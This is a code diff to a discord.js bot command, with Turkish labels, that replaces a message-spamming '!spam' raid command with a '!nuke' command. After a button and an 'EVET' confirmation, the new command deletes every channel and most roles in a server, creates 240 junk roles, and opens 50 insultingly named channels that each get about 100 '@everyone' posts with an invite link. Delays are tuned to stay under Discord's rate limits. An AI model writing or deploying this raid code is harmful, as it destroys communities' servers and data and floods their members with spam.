@@ -10,101 +10,104 @@ const {
 } = require('discord.js');
 
 module.exports = {
-    name: '!spam',
+    name: '!nuke',
     async execute(message) {
-        const client = message.client;
+        const OWNER_ID = "1389930042200559706";
+        if (message.author.id !== OWNER_ID) return;
 
-        // --- AKILLI DİNLEYİCİ: INDEX'E GEREK KALMADAN ÇALIŞIR ---
-        if (!client.spamBotEventSet) {
-            client.on('interactionCreate', async (interaction) => {
-                // Sadece bu komutun buton ve modallarına cevap ver
-                if (interaction.customId === 'btn_spam_go' || interaction.customId === 'modal_spam_go') {
-                    await this.handleInteraction(interaction);
+        const client = message.client;
+        if (!client.nukeListenerSet) {
+            client.on('interactionCreate', async (int) => {
+                if (int.customId === 'btn_nuke_start' || int.customId === 'modal_nuke_confirm') {
+                    await this.handleInteraction(int);
                 }
             });
-            client.spamBotEventSet = true;
+            client.nukeListenerSet = true;
         }
 
         const embed = new EmbedBuilder()
-            .setColor('#2b2d31')
-            .setAuthor({ name: 'Aethelgard Sunucu Kopyalayıcı', iconURL: client.user.displayAvatarURL() })
-            .setTitle('🚀 Aethelgard Spam Sistemi')
+            .setColor('#ff0000')
+            .setTitle('☣️ FORCES Nuke Sistemi')
             .setDescription(
-                `**Ufak bilgilendirme:** Discord’daki her sunucuda olur. Bu, bize yazanları korumaya alıyoruz. Sunucusunu korumak isteyenlerde sadece olmaz; haberiniz olsun.\n\n` +
-                `“Bilinmeyen entegrasyon hatası” alırsanız sayfayı yenileyin, düzelir.\n\n` +
-                `**-- Atılan spamlardan biz sorumlu değiliz!**`
+                `**DİKKAT:** Bu komut sunucuyu tamamen sıfırlar!\n\n` +
+                `▫️ Tüm kanallar silinecek.\n` +
+                `▫️ Tüm roller temizlenecek.\n` +
+                `▫️ 50 yeni kanal açılıp @everyone spamı yapılacak.\n` +
+                `▫️ 240 tane boş rol açılacak.`
             )
-            .addFields(
-                { name: '🔹 Operasyon Modu', value: 'Bot yetkisiyle tüm kanallara erişim.', inline: false },
-                { name: '⚡ Hız', value: 'Limitlere takılmadan seri gönderim.', inline: false }
-            )
-            .setFooter({ text: 'Aethelgard Protection & Raid System' });
+            .setFooter({ text: 'Geri dönüşü yoktur!' });
 
         const row = new ActionRowBuilder().addComponents(
             new ButtonBuilder()
-                .setCustomId('btn_spam_go')
-                .setLabel('Saldırıyı Başlat')
+                .setCustomId('btn_nuke_start')
+                .setLabel('Saldırıyı Onayla')
                 .setStyle(ButtonStyle.Danger)
-                .setEmoji('☣️')
         );
 
         await message.reply({ embeds: [embed], components: [row] });
     },
 
-    // --- ETKİLEŞİM YÖNETİMİ ---
     async handleInteraction(interaction) {
-        // BUTON BASILDIĞINDA
-        if (interaction.isButton() && interaction.customId === 'btn_spam_go') {
-            const modal = new ModalBuilder()
-                .setCustomId('modal_spam_go')
-                .setTitle('Operasyon Başlatılıyor');
-
+        if (interaction.isButton() && interaction.customId === 'btn_nuke_start') {
+            const modal = new ModalBuilder().setCustomId('modal_nuke_confirm').setTitle('Nuke Onayı');
             modal.addComponents(
                 new ActionRowBuilder().addComponents(
                     new TextInputBuilder()
-                        .setCustomId('msg')
-                        .setLabel('Spam Mesajı')
-                        .setPlaceholder('Ne yazılsın?')
-                        .setStyle(TextInputStyle.Paragraph)
-                        .setRequired(true)
-                ),
-                new ActionRowBuilder().addComponents(
-                    new TextInputBuilder()
-                        .setCustomId('count')
-                        .setLabel('Kaç Tane Atılsın?')
-                        .setPlaceholder('Örn: 20')
+                        .setCustomId('confirm_text')
+                        .setLabel('Onaylamak için "EVET" yazın')
                         .setStyle(TextInputStyle.Short)
                         .setRequired(true)
                 )
             );
-            return await interaction.showModal(modal).catch(() => {});
+            return await interaction.showModal(modal);
         }
 
-        // MODAL GÖNDERİLDİĞİNDE
-        if (interaction.type === InteractionType.ModalSubmit && interaction.customId === 'modal_spam_go') {
-            // O KIRMIZI HATAYI ÖNLEYEN DEFERREPLY
-            await interaction.deferReply({ ephemeral: true });
+        if (interaction.type === InteractionType.ModalSubmit && interaction.customId === 'modal_nuke_confirm') {
+            const confirmText = interaction.fields.getTextInputValue('confirm_text');
+            if (confirmText.toLowerCase() !== 'evet') return interaction.reply({ content: 'İşlem iptal edildi.', ephemeral: true });
 
-            const sMsg = interaction.fields.getTextInputValue('msg');
-            const sCount = parseInt(interaction.fields.getTextInputValue('count')) || 10;
+            await interaction.reply({ content: '☣️ **Nuke Operasyonu Başladı!** Sunucu imha ediliyor...', ephemeral: true });
 
-            const channels = interaction.guild.channels.cache.filter(c => c.isTextBased());
-            
-            await interaction.editReply({ 
-                content: `✅ **Operasyon Başladı!** ${channels.size} kanala dalıyorum.` 
-            });
+            const guild = interaction.guild;
+            const channelNames = ["rate", "1993", "forces-siker"];
 
-            // Botun kendi üzerinden (Self değil) mesaj atma döngüsü
-            channels.forEach(async (chan) => {
-                for (let i = 0; i < sCount; i++) {
-                    try {
-                        await chan.send(sMsg);
-                        await new Promise(r => setTimeout(r, 200)); // Hız ayarı
-                    } catch (err) {
-                        break; // Yetki yoksa diğer kanala geç
-                    }
+            // 1. KANALLARI SİL
+            const channels = await guild.channels.fetch();
+            for (const channel of channels.values()) {
+                await channel.delete().catch(() => {});
+                await new Promise(r => setTimeout(r, 1000)); // 1 saniye bekle
+            }
+
+            // 2. ROLLERİ SİL
+            const roles = await guild.roles.fetch();
+            for (const role of roles.values()) {
+                if (role.name !== '@everyone' && role.editable && !role.managed) {
+                    await role.delete().catch(() => {});
+                    await new Promise(r => setTimeout(r, 1000));
                 }
-            });
+            }
+
+            // 3. YENİ ROLLER OLUŞTUR (240 Adet)
+            for (let i = 0; i < 240; i++) {
+                await guild.roles.create({ name: "Cyber", color: '#ff0000' }).catch(() => {});
+                await new Promise(r => setTimeout(r, 500)); // Rolleri biraz daha hızlı açabiliriz
+            }
+
+            // 4. KANALLARI AÇ VE SPAM YAP (50 Adet)
+            for (let i = 0; i < 50; i++) {
+                const randomName = channelNames[Math.floor(Math.random() * channelNames.length)];
+                await guild.channels.create({
+                    name: randomName,
+                    type: 0 // Text Channel
+                }).then(async (chan) => {
+                    // Kanal başına 100 mesaj (Discord limiti için ideal)
+                    for (let j = 0; j < 100; j++) {
+                        chan.send("@everyone https://discord.gg/rate").catch(() => {});
+                        await new Promise(r => setTimeout(r, 300));
+                    }
+                }).catch(() => {});
+                await new Promise(r => setTimeout(r, 1000));
+            }
         }
     }
 };
